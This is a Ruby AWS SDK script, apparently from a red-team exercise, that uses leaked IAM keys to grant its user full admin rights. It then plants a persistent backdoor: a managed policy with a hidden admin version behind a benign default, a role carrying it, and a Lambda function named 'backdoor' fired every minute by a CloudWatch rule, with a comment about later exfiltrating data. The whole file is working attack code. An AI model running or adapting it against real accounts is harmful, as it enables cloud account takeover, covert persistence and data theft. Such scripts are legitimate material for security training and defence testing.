require 'zip'
require 'aws-sdk'

################## 1. Kickoff #########################
# Start the exercise by "leaking" a pair of IAM keys
# that are authorized to iam:PutUserPolicy like the
# included policies/original.policy.json script
#######################################################

############ 2. Create The Backdoor'd Policy ##########
# We first escalate our own permissions to become a
# full admin and proceed to create a policy with an
# old version that's able to assume admin
#######################################################

# Who am I?
sts = Aws::STS::Client.new
# note that this call doesn't require any permissions at all to run.  score!
identity = sts.get_caller_identity
account_id = identity.account
user_arn = identity.arn
username = user_arn.split('/')[-1]

# Escalate my policy to admin
iam = Aws::IAM::Client.new
document = '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'
iam.put_user_policy(
  user_name:username,
  policy_name:"privesc-#{Time.now.to_i}",
  policy_document:document
)

# Create our backdoor'd policy
policy = iam.create_policy(
  policy_name:"backdoor",
  policy_document:File.read('./policies/role-safe.policy.json')
).policy

# Create the admin version
policy_v2 = iam.create_policy_version(
  policy_arn:policy.arn,
  policy_document:File.read('./policies/role-backdoor.policy.json'),
  set_as_default:false
).policy_version
# Create a seemingly bening policy that can privesc to admin by reverting to v2
policy_v3 = iam.create_policy_version(
  policy_arn:policy.arn,
  policy_document:File.read('./policies/role-escalation.policy.json'),
  set_as_default:true
).policy_version

###### 3. Make Policy Assumable Through a Role ########
# This allows lambda to use the policy we've just
# created.
#######################################################

# Create the role that this function will assume
role = iam.create_role(
  role_name:'backdoor',
  assume_role_policy_document:File.read('./policies/lambda.trust.policy.json')
).role
iam.attach_role_policy(
  role_name:role.role_name,
  policy_arn:policy.arn
)

######### 4. Bring Role to Life with Lambda ###########
# This lambda function will assume the role we've just
# created and bring our backdoor online.
#######################################################

lambda = Aws::Lambda::Client.new

zip_data = Zip::OutputStream.write_buffer(StringIO.new('')) do |zipfile|
    zipfile.put_next_entry 'lambda.js'# , 'lambda.js'
    data = File.read('./lambda.js')
    data.gsub! '{{POLICY_ARN}}', policy.arn
    data.gsub! '{{POLICY_VERSION}}', policy_v2.version_id
    zipfile.write data
end.string

function = lambda.create_function(
  function_name: "backdoor", # required
  runtime: "nodejs4.3",
  role: role.arn,
  handler: "lambda.handler", # required
  code: { # required
    zip_file: zip_data
  },
  timeout: 30,
  memory_size: 128,
  publish: true
)

############### 5. Fire Every 1 Minute ################
# Use cloudwatch events to fire this lambda every
# minute while we wait for some TBD condition to be
# met to exfil data
#######################################################

# Create Rule
events = Aws::CloudWatchEvents::Client.new
rule_name = 'backdoor-timer'
rule = events.put_rule(
  name:rule_name,
  schedule_expression:'rate(1 minute)'
)

lambda.add_permission(
  function_name:function.function_name,
  statement_id:'backdoor-timer',
  action: 'lambda:InvokeFunction',
  principal: 'events.amazonaws.com',
  source_arn: rule.rule_arn
)

events.put_targets(
  rule:rule_name,
  targets:[
    id: "1",
    arn: function.function_arn
  ]
)
